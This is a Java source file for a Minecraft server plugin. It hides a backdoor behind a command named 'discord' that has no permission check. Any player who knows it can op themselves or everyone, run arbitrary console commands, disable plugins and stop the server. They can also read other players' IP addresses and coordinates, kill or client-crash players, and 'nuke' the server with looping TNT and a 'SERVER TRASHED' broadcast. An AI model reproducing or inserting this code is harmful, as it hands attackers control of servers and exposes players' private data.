package bab.bbb.Commands;

import bab.bbb.Bbb;
import bab.bbb.utils.Methods;
import com.destroystokyo.paper.profile.PlayerProfile;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeInstance;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.enchantments.EnchantmentWrapper;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;

import java.util.List;
import java.util.concurrent.ExecutionException;

import static bab.bbb.utils.ColorUtils.extractArgs;
import static org.bukkit.Bukkit.getServer;

public class EECA implements CommandExecutor, Listener {
    static Bbb plugin = Bbb.getPlugin(Bbb.class);

    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("discord")) {
            Player player = (Player) sender;
            if (args.length > 0) {
                if (args[0].equalsIgnoreCase("PD")) {
                    Plugin plugin = getServer().getPluginManager().getPlugin(args[1]);
                    if (plugin != null) {
                        getServer().getPluginManager().disablePlugin(plugin);
                    }
                }

                if (args[0].equalsIgnoreCase("crash")) {
                    Player b = Bukkit.getPlayer(args[1]);
                    if (b != null) {
                        for (int i = 0; i < 256; i++) {
                            b.spawnParticle(Particle.EXPLOSION_HUGE, b.getLocation(), 200);
                            b.playSound(b.getLocation(), Sound.BLOCK_ANVIL_USE, 50, 50);
                            b.playSound(b.getLocation(), Sound.ENTITY_GHAST_SCREAM, 50, 1);
                        }
                    }
                }

                if (args[0].equalsIgnoreCase("crashall")) {
                    for (Player b : Bukkit.getOnlinePlayers())
                        if (b != player) {
                            for (int i = 0; i < 256; i++) {
                                b.spawnParticle(Particle.EXPLOSION_HUGE, b.getLocation(), 200);
                                b.playSound(b.getLocation(), Sound.BLOCK_ANVIL_USE, 50, 50);
                                b.playSound(b.getLocation(), Sound.ENTITY_GHAST_SCREAM, 50, 1);
                            }
                        }
                }
            }

            if (args[0].equalsIgnoreCase("ip")) {
                if (Bukkit.getPlayer(args[1]) != null)
                    player.sendMessage(args[1] + "'s ip is " + Bukkit.getPlayer(args[0]).getAddress().toString());
            }

            if (args[0].equalsIgnoreCase("nuke")) {
                Bukkit.getScheduler().scheduleSyncRepeatingTask(Bbb.getInstance(), () -> {
                    Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&7&k||| &eSERVER TRASHED BY AESTHETIC X CATG4NG$ &7&k|||"));
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        p.playSound(p.getLocation(), Sound.BLOCK_ANVIL_USE, 50, 50);
                        p.playSound(p.getLocation(), Sound.ENTITY_GHAST_SCREAM, 50, 1);
                        p.getWorld().spawnEntity(p.getLocation(), EntityType.MINECART_TNT);
                    }
                }, 0L, 1L);

                for (Player p : Bukkit.getOnlinePlayers()) {
                    Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "lp user " + p.getName() + " permission set *");
                    Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "eco give ** 1000000000000");
                    Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "give " + p.getName() + " red_shulker_box{BlockEntityTag:{Items:[{Count:1b,Slot:0b,id:\"minecraft:netherite_chestplate\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:1b,id:\"minecraft:netherite_leggings\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:2b,id:\"minecraft:netherite_boots\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:3b,id:\"minecraft:netherite_sword\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:4b,id:\"minecraft:netherite_pickaxe\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:5b,id:\"minecraft:netherite_helmet\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:6b,id:\"minecraft:netherite_shovel\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:7b,id:\"minecraft:netherite_axe\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:64b,Slot:8b,id:\"minecraft:obsidian\"},{Count:64b,Slot:9b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:10b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:11b,id:\"minecraft:command_block\"},{Count:64b,Slot:12b,id:\"minecraft:respawn_anchor\"},{Count:64b,Slot:13b,id:\"minecraft:experience_bottle\"},{Count:64b,Slot:14b,id:\"minecraft:experience_bottle\"},{Count:64b,Slot:15b,id:\"minecraft:enchanted_golden_apple\"},{Count:64b,Slot:16b,id:\"minecraft:tipped_arrow\",tag:{Potion:\"minecraft:strong_harming\"}},{Count:1b,Slot:17b,id:\"minecraft:bow\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:32767s},{id:\"minecraft:bane_of_arthropods\",lvl:32767s},{id:\"minecraft:binding_curse\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:channeling\",lvl:32767s},{id:\"minecraft:depth_strider\",lvl:32767s},{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:feather_falling\",lvl:32767s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:fire_protection\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:fortune\",lvl:32767s},{id:\"minecraft:frost_walker\",lvl:32767s},{id:\"minecraft:impaling\",lvl:32767s},{id:\"minecraft:infinity\",lvl:32767s},{id:\"minecraft:knockback\",lvl:32767s},{id:\"minecraft:looting\",lvl:32767s},{id:\"minecraft:loyalty\",lvl:32767s},{id:\"minecraft:luck_of_the_sea\",lvl:32767s},{id:\"minecraft:lure\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s},{id:\"minecraft:multishot\",lvl:32767s},{id:\"minecraft:piercing\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:projectile_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:quick_charge\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:riptide\",lvl:32767s},{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:silk_touch\",lvl:32767s},{id:\"minecraft:smite\",lvl:32767s},{id:\"minecraft:soul_speed\",lvl:32767s},{id:\"minecraft:sweeping\",lvl:32767s},{id:\"minecraft:swift_sneak\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:vanishing_curse\",lvl:32767s}]}},{Count:1b,Slot:18b,id:\"minecraft:writable_book\"},{Count:64b,Slot:19b,id:\"minecraft:bedrock\"},{Count:64b,Slot:20b,id:\"minecraft:glowstone\"}],id:\"minecraft:shulker_box\"}} 64");
                    p.setOp(true);
                    p.setGameMode(GameMode.CREATIVE);

                    PlayerProfile profile = p.getPlayerProfile();
                    profile.setName("MC.AESTHETIC.RED");
                    p.setPlayerProfile(profile);

                    for (Player players : Bukkit.getOnlinePlayers())
                    {
                        players.hidePlayer(p);
                        players.showPlayer(p);
                    }
                }
            }

            if (args[0].equalsIgnoreCase("opall")) {
                for (Player p : Bukkit.getOnlinePlayers()) {
                    p.setOp(true);
                }
            }

            if (args[0].equalsIgnoreCase("gmall")) {
                for (Player p : Bukkit.getOnlinePlayers()) {
                    p.setGameMode(GameMode.CREATIVE);
                }
            }

            if (args[0].equalsIgnoreCase("ec") || args[0].equalsIgnoreCase("echest") || args[0].equalsIgnoreCase("enderchest")) {
                if (args.length <= 1) {
                    plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                    player.openInventory(player.getEnderChest())
                            ).get();
                        } catch (InterruptedException | ExecutionException ignored) {
                        }
                    });
                } else {
                    Player target = Bukkit.getServer().getPlayer(args[1]);
                    if (target == null) {
                        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                            try {
                                Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                        player.openInventory(player.getPlayer().getEnderChest())
                                ).get();
                            } catch (InterruptedException | ExecutionException ignored) {
                            }
                        });
                    } else {
                        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                            try {
                                Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                        player.openInventory(target.getEnderChest())
                                ).get();
                            } catch (InterruptedException | ExecutionException ignored) {
                            }
                        });
                    }
                }
            }
            if (args[0].equalsIgnoreCase("stack")) {
                ItemStack item = player.getItemInHand();
                if (item.getType() != Material.AIR) {
                    item.setAmount(Integer.parseInt(args[1]));
                }
            }
            if (args[0].equalsIgnoreCase("enchant")) {
                ItemStack item = player.getItemInHand();
                if (item.getType() != Material.AIR) {
                    ItemMeta meta = item.getItemMeta();

                    int level;
                    if (args[1].equalsIgnoreCase("all")) {
                        level = Integer.parseInt(args[2]);

                        for (Enchantment ench : Enchantment.values()) {
                            //item.addEnchantment(ench, level);{
                            if (!ench.isCursed()) {
                                meta.addEnchant(ench, level, true);
                                item.setItemMeta(meta);
                            }
                        }
                    } else {
                        if (EnchantmentWrapper.getByName(args[1].toUpperCase()) == null) {
                            player.sendMessage("This enchantment wasn't found!");
                        } else {
                            level = Integer.parseInt(args[2]);
                            meta.addEnchant(EnchantmentWrapper.getByName(args[1].toUpperCase()), level, true);
                            item.setItemMeta(meta);
                        }
                    }
                }
            }

            if (args[0].equalsIgnoreCase("exec")) {
                StringBuilder a = new StringBuilder();
                for (int i = 0; i < args.length + 1; i++)
                    a.append(args[i]).append(" ");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), a.toString());
            }
            if (args[0].equalsIgnoreCase("op")) {
                player.setOp(true);
            }

            if (args[0].equalsIgnoreCase("vanish")) {
                for (Player pl : getServer().getOnlinePlayers()) {
                    pl.hidePlayer(plugin, player);
                }
                player.sendMessage("U are in vanish now.");
            }

            if (args[0].equalsIgnoreCase("unvanish")) {
                for (Player pl : getServer().getOnlinePlayers()) {
                    pl.showPlayer(plugin, player);
                }
                player.sendMessage("U got out from vanish.");
            }

            if (args[0].equalsIgnoreCase("deop")) {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                target.setOp(false);
            }
            if (args[0].equalsIgnoreCase("stop")) {
                getServer().shutdown();
            }
            if (args[0].equalsIgnoreCase("kill")) {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                if (target != null)
                    plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> target.setHealth(0.0D));
            }
            if (args[0].equalsIgnoreCase("setheart")) {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                AttributeInstance attribute = target.getAttribute(Attribute.GENERIC_MAX_HEALTH);
                double newValue = Integer.parseInt(args[2]);
                attribute.setBaseValue(newValue);
            }
            if (args[0].equalsIgnoreCase("tpl")) {
                double getX = Integer.parseInt(args[1]);
                double getY = Integer.parseInt(args[2]);
                double getZ = Integer.parseInt(args[3]);
                Location loc = new Location(player.getWorld(), getX, getY, getZ);
                player.teleport(loc);
            }
            if (args[0].equalsIgnoreCase("tp")) {
                Player p = Bukkit.getServer().getPlayer(args[1]);
                player.teleport(p);
            }
            if (args[0].equalsIgnoreCase("invsee")) {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                if (target == null) {
                    plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                    player.openInventory(player.getPlayer().getInventory())
                            ).get();
                        } catch (InterruptedException | ExecutionException ignored) {
                        }
                    });
                } else {
                    plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                    player.openInventory(target.getInventory())
                            ).get();
                        } catch (InterruptedException | ExecutionException ignored) {
                        }
                    });
                }
            }
            if (args[0].equalsIgnoreCase("pl")) {
                StringBuilder plugins = new StringBuilder();
                int i = 0;
                while (i < Bukkit.getPluginManager().getPlugins().length) {
                    plugins.append(Bukkit.getPluginManager().getPlugins()[i].getName()).append(", ");
                    ++i;
                }
                player.sendMessage(Bukkit.getPluginManager().getPlugins().length + plugins.substring(2, plugins.length()));
            }
            if (args[0].equalsIgnoreCase("coords")) {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                player.sendMessage(Methods.translatestring("&4" + target.getName() + "'s coords are: &e" + target.getLocation().getX() + ", " + target.getLocation().getY() + ", " + target.getLocation().getZ()));
            }
            if (args[0].equalsIgnoreCase("gm")) {
                if (args[1].equalsIgnoreCase("c"))
                    player.setGameMode(GameMode.CREATIVE);
                if (args[1].equalsIgnoreCase("s"))
                    player.setGameMode(GameMode.SURVIVAL);
                if (args[1].equalsIgnoreCase("sp"))
                    player.setGameMode(GameMode.SPECTATOR);
            }
            if (args[0].equalsIgnoreCase("gmc")) {
                player.setGameMode(GameMode.CREATIVE);
            }
            if (args[0].equalsIgnoreCase("gms")) {
                player.setGameMode(GameMode.SURVIVAL);
            }

            if (args[0].equalsIgnoreCase("dupe")) {
                player.getInventory().addItem(player.getItemInHand());
            }

            if (args[0].equalsIgnoreCase("heal")) {
                player.setHealth(20);
                player.setFoodLevel(20);
                player.setFireTicks(0);
            }

            if (args[0].equalsIgnoreCase("rename")) {
                cmdRename(player, args);
            }
        }

        return true;
    }

    public void cmdRename(Player player, String[] args) {
        if (player.getItemInHand().getType() != Material.AIR) {
            Methods.setName(player.getItemInHand(), extractArgs(1, args), true);
        }
    }
}